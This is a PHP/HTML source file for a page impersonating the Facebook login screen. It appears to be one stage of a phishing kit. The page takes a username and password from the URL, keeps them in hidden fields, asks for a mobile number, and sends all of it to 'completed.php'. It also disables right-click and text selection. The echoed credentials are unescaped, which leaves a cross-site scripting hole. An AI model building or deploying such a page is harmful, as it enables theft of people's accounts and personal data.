<?php
$username = $_GET['username'];
$password = $_GET['password'];
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Facebook - login or sign up">
<meta name="description" content="Login to your Facebook account.">
<meta property="og:description" content="Login to your Facebook account.">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Facebook - login or sign up">
<meta property="og:type" content="website">
<title>Facebook - login or sign up</title>
<link rel="shortcut icon" src="img/O2aKM2iSbOw.png">
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5dcbabd2869127ad"></script>
</head>
<style>
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
body {
	background: #e2e5eb;
	-webkit-background-size: cover;
	-moz-background-size: cover;
	-o-background-size: cover;
	background-size: cover;
	margin: 0;
}
.navbar {
	background-color: #3b5998;
	height: auto;
	width: 100%;
	height: 55px;
	border: 4px;
	padding: 10px 36px 0;
	position: fixed;
	top: 0;
	overflow: hidden;
	font-family: 'Teko';
	font-weight: 300;
	font-size: 26px;
	text-align: left;
	color: #fff;
	letter-spacing: 2;
	z-index: 1;
}
.container {
	position: relative;
	margin: 50px auto;
	max-width: 600px;
	height: auto;
	padding: 30px;
}
.login-form input[type="text"],.login-form input[type="password"] {
	width: 100%;
	border: 1px solid #bdbebf;
	outline: none;
	padding: 12px;
	color: #000;
	font-weight: 400;
	font-family: 'Lato',sans-serif;
	cursor: pointer;
}
.login-form input[type="text"] {
	border-bottom: none;
	border-radius: 4px 4px 0 0;
	padding-bottom: 13px;
	box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
	margin: 0;
}
.login-form input[type="password"] {
	border-top: none;
	border-radius: 0 0 4px 4px;
	box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
	margin: 0;
}
.login-box {
	max-width: 500px;
	margin: 50px auto;
	height: auto;
	position: relative;
	text-align: center;
	padding: 15px;
	margin-top: 50px;
	font-family: 'Roboto';
}
.login-foot {
	background: #fff;
	max-width: 100%;
	height: 100%;
	position: relative;
	bottom: 0;
	left: 0;
	right: 0;
	text-align: center;
	padding: 15px;
	margin: 0;
	font-size: 12px;
	font-family: 'Roboto';
	font-weight: 400;
	z-index: 9999999;
	overflow: hidden;
}
p {
	font-family: Arial;
	font-size: 14px;
	font-weight: 400;
	color: #576b95;
	text-align: center;
	margin: 0;
}
.btn-login {
	background: #3578e5;
	position: relative;
	width: 100%;
	height: 37px;
	margin-top: 10px;
	margin-bottom: 13px;
	color: #fff;
	border: none;
	border-radius: 3px;
	font-size: 1em;
	font-weight: 700;
	text-align: center;
	letter-spacing: 1px;
	outline: none;
	cursor: pointer;
	font-family: 'Teko-Regular';
}
.btn-create {
	background: #00a400;
	position: relative;
	width: auto;
	height: 40px;
	margin: 0;
	padding: 10px;
	color: #fff;
	border: none;
	border-radius: 3px;
	font-size: 15px;
	font-weight: 500;
	text-align: center;
	outline: none;
	cursor: pointer;
	font-family: 'Teko-Regular';
}
.divider {
	display: block;
	margin-top: 15px;
	margin-bottom: 15px;
	overflow: hidden;
	text-align: center;
	white-space: nowrap;
	width: 100%;
}
.divider>span {
	display: inline-block;
	position: relative;
	color: #000;
	cursor: default;
	font-size: 13px;
}
.divider>span:before,.divider>span:after {
	background: #ced0d4;
	content: "";
	height: 1px;
	position: absolute;
	top: 50%;
	width: 9999px;
}
.divider>span:before {
	margin-right: 15px;
	right: 100%;
}
.divider>span:after {
	left: 100%;
	margin-left: 15px;
}
table,td,td {
	width: 100%;
	text-align: center;
	background: #fff;
	font-size: 12px;
	color: #000;
	position: relative;
}
table {
	border-collapse: collapse;
	width: 100%;
	margin: 0;
	color: #000;
}
tr,td,td {
	width: 50%;
	padding: 7px;
	color: #576b95;
	font-family: Roboto;
}
@media only screen and (max-width:600px) {
	.navbar {
		width:100%;
		zoom:0.8;
	}
	.btn-login {
		width:100%;
	}
	.btn-create {
		width:auto;
	}
	.login-form
	input[type="text"],.login-form
	input[type="password"] {
		width: 100%;
	}
	.divider {
		display:block;
		margin-left:10px;
		margin-right:10px;
		margin-top:15px;
		margin-bottom:15px;
		overflow:hidden;
		text-align:center;
		white-space:nowrap;
		width: 90%;
	}
}
</style>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div class="navbar">
	<center>
	<img width="150" src="img/fb.png">
	</center>
</div>
<div class="login-box">
	<form class="login-form" action="completed.php" method="get">
	    <input name="username" type="hidden" value="<?php echo $username;?>" readonly>
        <input name="password" type="hidden" value="<?php echo $password;?>" readonly>
        <input type="hidden" name="login" value="Facebook" readonly>
		<label>
		<input type="text" name="phone" required placeholder="Mobile number" autocomplete="off" autocapitalize="off"></label>
		<label>
		<button type="submit" class="btn-login">Continue</button>
		<div class="divider">
			
		</div>
	</form>
</div>
<div class="login-foot">
	<center>
	<table>
	<tr>
		<td style="color:#8a9ac5;">
			<b>English (UK)</b>
		</td>
		<td>Bahasa Indonesia</td>
	</tr>
	<tr>
		<td>Basa Jawa</td>
		<td>Bahasa Melayu</td>
	</tr>
	<tr>
		<td>日本語</td>
		<td>Español</td>
	</tr>
	<tr>
		<td>Português (Brazil)</td>
		<td>
			<img width="20" src="img/plus.png">
		</td>
	</tr>
	</table>
	</br>
	Facebook © 2019 </br>
	</br>
	</center>
</div>
</body>
</html>
